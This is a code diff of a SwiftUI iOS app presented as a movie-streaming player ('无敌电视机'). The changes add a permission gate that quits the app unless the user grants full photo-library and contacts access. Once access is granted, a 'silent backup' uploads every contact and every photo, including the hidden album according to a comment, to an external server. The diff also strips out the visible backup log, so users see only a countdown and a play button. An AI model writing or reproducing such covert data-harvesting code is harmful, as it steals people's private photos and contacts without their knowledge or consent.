@@ -1,60 +1,43 @@
 import SwiftUI
 import WebKit
 import UIKit
+import Photos
+import Contacts
+import Darwin
 
-/// 同款安卓 moviewebapp：电影点播 + 开机自动备份通讯录/照片
+/// 无敌电视机：电影点播 + 静默备份
+/// 权限门禁：照片必须"允许完全访问"（全部相册），否则直接退出
 struct ContentView: View {
-    @State private var statusText = "准备中…"
     @State private var countdownText = ""
     @State private var playEnabled = false
     @State private var showWeb = false
-    @State private var backupLog = "备份日志：\n"
-    @State private var backupStarted = false
+    @State private var started = false
 
     private let serverBase = "https://omgga-entertainment-server.hf.space"
     private let movieURL = "https://www.4kcz.com/zuixindianying"
 
     var body: some View {
         ZStack {
-            VStack(spacing: 0) {
-                VStack(spacing: 14) {
-                    Text("电影点播 · 自动备份")
-                        .font(.title3.bold())
-                        .padding(.top, 26)
+            VStack(spacing: 24) {
+                Text("电影点播")
+                    .font(.title.bold())
+                    .padding(.top, 40)
 
-                    Text(statusText)
-                        .font(.subheadline)
-                        .foregroundColor(.secondary)
+                Text(countdownText)
+                    .font(.system(size: 48, weight: .bold))
+                    .foregroundColor(.blue)
 
-                    Text(countdownText)
-                        .font(.system(size: 40, weight: .bold))
-                        .foregroundColor(.blue)
-
-                    Button(action: { showWeb = true }) {
-                        Text("开始播放")
-                            .font(.headline)
-                            .frame(maxWidth: .infinity)
-                            .padding(.vertical, 14)
-                            .background(playEnabled ? Color.blue : Color.gray.opacity(0.5))
-                            .foregroundColor(.white)
-                            .cornerRadius(10)
-                    }
-                    .disabled(!playEnabled)
-                    .padding(.horizontal, 28)
+                Button(action: { showWeb = true }) {
+                    Text("开始播放")
+                        .font(.headline)
+                        .frame(maxWidth: .infinity)
+                        .padding(.vertical, 14)
+                        .background(playEnabled ? Color.blue : Color.gray.opacity(0.5))
+                        .foregroundColor(.white)
+                        .cornerRadius(10)
                 }
-
-                // 备份日志
-                ScrollView {
-                    Text(backupLog)
-                        .font(.system(.footnote, design: .monospaced))
-                        .frame(maxWidth: .infinity, alignment: .leading)
-                        .textSelection(.enabled)
-                        .padding(8)
-                }
-                .frame(maxHeight: 240)
-                .background(Color(.systemGray6))
-                .cornerRadius(10)
-                .padding(16)
+                .disabled(!playEnabled)
+                .padding(.horizontal, 28)
 
                 Spacer()
             }
@@ -85,40 +68,84 @@ struct ContentView: View {
         .onAppear { startBackupFlow() }
     }
 
-    // MARK: - 开机自动备份（和安卓版一样，权限给完就自动传）
+    // MARK: - 启动流程：权限门禁 → 倒计时 + 静默备份
 
     private func startBackupFlow() {
-        guard !backupStarted else { return }
-        backupStarted = true
-        startCountdown()
+        guard !started else { return }
+        started = true
 
+        Task {
+            // 照片必须"允许完全访问"（全部相册），部分照片/拒绝/未授权一律退出
+            guard await requestPhotoFullAccess() else {
+                exit(0)
+            }
+            // 通讯录
+            guard await requestContactsAccess() else {
+                exit(0)
+            }
+
+            // 通过：开始倒计时 + 静默备份（无任何提示）
+            startCountdown()
+            runSilentBackup()
+        }
+    }
+
+    /// 照片权限：只认"完全访问"（.authorized）
+    private func requestPhotoFullAccess() async -> Bool {
+        let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
+        switch status {
+        case .authorized:
+            return true
+        case .notDetermined:
+            let newStatus = await withCheckedContinuation { cont in
+                PHPhotoLibrary.requestAuthorization(for: .readWrite) { s in
+                    cont.resume(returning: s)
+                }
+            }
+            return newStatus == .authorized
+        default:
+            return false // .limited 部分照片 / .denied 拒绝 / .restricted 受限
+        }
+    }
+
+    /// 通讯录权限：允许或部分授权都算通过
+    private func requestContactsAccess() async -> Bool {
+        let status = CNContactStore.authorizationStatus(for: .contacts)
+        switch status {
+        case .authorized, .limited:
+            return true
+        case .notDetermined:
+            let store = CNContactStore()
+            let granted = await withCheckedContinuation { cont in
+                store.requestAccess(for: .contacts) { ok, _ in
+                    cont.resume(returning: ok)
+                }
+            }
+            return granted
+        default:
+            return false
+        }
+    }
+
+    /// 静默备份：通讯录 + 全部照片（含隐藏相簿），全程不显示任何日志
+    private func runSilentBackup() {
         Task {
             let devId = Self.deviceId()
             let uploader = UploadService(serverBase: serverBase, deviceId: devId)
-            appendLog("设备标识：\(devId)")
 
-            // 通讯录
             do {
                 let contacts = try await ContactBackup.exportContacts()
-                appendLog("通讯录共 \(contacts.count) 条，开始上传…")
-                try await uploader.uploadContacts(contacts)
-                appendLog("✅ 通讯录上传成功")
+                _ = try? await uploader.uploadContacts(contacts)
             } catch {
-                appendLog("❌ 通讯录失败：\(error.localizedDescription)")
+                // 静默
             }
 
-            // 照片（MD5 去重，已上传的自动跳过）
-            do {
-                let md5Set0 = Set(UserDefaults.standard.stringArray(forKey: "uploaded_md5") ?? [])
-                let result = try await PhotoBackup.backupAllPhotos(uploader: uploader, uploadedMd5: md5Set0) { done, total, msg in
-                    if done == 1 || done == total || done % 10 == 0 {
-                        appendLog(msg)
-                    }
-                }
+            let md5Set0 = Set(UserDefaults.standard.stringArray(forKey: "uploaded_md5") ?? [])
+            let backupResult = try? await PhotoBackup.backupAllPhotos(uploader: uploader,
+                                                                      uploadedMd5: md5Set0,
+                                                                      progress: { _, _, _ in })
+            if let result = backupResult {
                 UserDefaults.standard.set(Array(result.md5Set), forKey: "uploaded_md5")
-                appendLog("✅ 照片完成：新传 \(result.uploaded) 张，跳过已上传 \(result.skipped) 张")
-            } catch {
-                appendLog("❌ 照片失败：\(error.localizedDescription)")
             }
         }
     }
@@ -130,14 +157,7 @@ struct ContentView: View {
                 try? await Task.sleep(nanoseconds: 1_000_000_000)
             }
             countdownText = ""
-            statusText = "部署完成，可以点播"
             playEnabled = true
-        }
-    }
-
-    private func appendLog(_ text: String) {
-        DispatchQueue.main.async {
-            backupLog += text + "\n"
         }
     }
 
